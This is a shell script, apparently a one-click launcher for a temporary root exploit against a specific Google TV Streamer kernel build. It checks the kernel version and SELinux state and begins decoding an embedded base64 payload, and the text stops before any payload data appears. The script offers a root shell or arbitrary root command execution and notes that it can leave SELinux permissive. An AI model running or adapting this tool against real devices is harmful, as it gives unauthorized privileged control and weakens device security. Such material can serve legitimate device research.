#!/system/bin/sh
# ghostlock-kirkwood-oneclick.sh -- single-file temporary root for
# Google TV Streamer (kirkwood, MT8696, Android 14, kernel 5.15.180).
#
# LAB USE ONLY.  One exploit attempt per boot; root survives until reboot.
#
#   adb push ghostlock-kirkwood-oneclick.sh /data/local/tmp/
#   adb shell
#   sh /data/local/tmp/ghostlock-kirkwood-oneclick.sh          # root shell
#   sh /data/local/tmp/ghostlock-kirkwood-oneclick.sh --exec "id"
#   sh /data/local/tmp/ghostlock-kirkwood-oneclick.sh --no-shell
#
# The script never reboots, never writes outside /data/local/tmp, never
# persists anything and does not touch /system.
set -u

DIR="/data/local/tmp/.ghostlock-oneclick"
ABS="kirkwood_root_shell_$$"
MODE="shell"
CMD=""
SETTLE="80000"
LOOPS="20000"

while [ $# -gt 0 ]; do
  case "$1" in
    --exec)       MODE="exec";  CMD="${2:-}"; shift 2 ;;
    --no-shell)   MODE="none";  shift ;;
    --extract-only) MODE="extract"; shift ;;
    --settle-us)  SETTLE="${2:-80000}"; shift 2 ;;
    --perf-loops) LOOPS="${2:-40000}"; shift 2 ;;
    -h|--help)
      grep '^#' "$0" | sed 's/^# \{0,1\}//' | head -20
      exit 0 ;;
    *) echo "unknown argument: $1"; exit 2 ;;
  esac
done

KVER="$(uname -r 2>/dev/null)"
case "$KVER" in
  5.15.180-android14-11-gf55c0c36ffcd-ab13512086*) ;;
  *) echo "[!] unsupported kernel: $KVER"; exit 3 ;;
esac

if [ "$(getenforce 2>/dev/null)" = "Permissive" ] && \
   [ ! -e /data/local/tmp/root_agent_ready ]; then
  echo "[!] SELinux is already permissive but no root agent is present."
  echo "    Reboot the device first (the previous run left it permissive)."
  exit 4
fi

rm -rf "$DIR" 2>/dev/null
mkdir -p "$DIR" || { echo "[!] cannot create $DIR"; exit 5; }

echo "[*] extracting payload to $DIR"
base64 -d > "$DIR/payload.tar.gz" <<'__GL_PAYLOAD__'
